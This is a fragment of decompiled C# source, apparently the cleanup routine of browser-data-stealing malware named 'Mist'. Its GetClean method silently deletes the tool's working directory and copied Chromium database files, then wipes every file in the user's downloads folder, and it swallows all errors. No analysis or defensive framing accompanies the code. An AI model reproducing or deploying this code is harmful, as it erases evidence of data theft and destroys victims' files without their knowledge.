using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000005 RID: 5
	internal class Clean
	{
		// Token: 0x06000007 RID: 7 RVA: 0x00005C10 File Offset: 0x00003E10
		public static void GetClean()
		{
			try
			{
				if (Directory.Exists(Help.dir))
				{
					Directory.Delete(Help.dir + "\\", true);
				}
				if (File.Exists(Chromium.bd))
				{
					File.Delete(Chromium.bd);
				}
				if (File.Exists(Chromium.ls))
				{
					File.Delete(Chromium.ls);
				}
				string[] files = Directory.GetFiles(Help.downloadsDir);
				for (int i = 0; i < files.Length; i++)
				{
					File.Delete(files[i]);
				}
			}
			catch
			{
			}
		}
	}
}
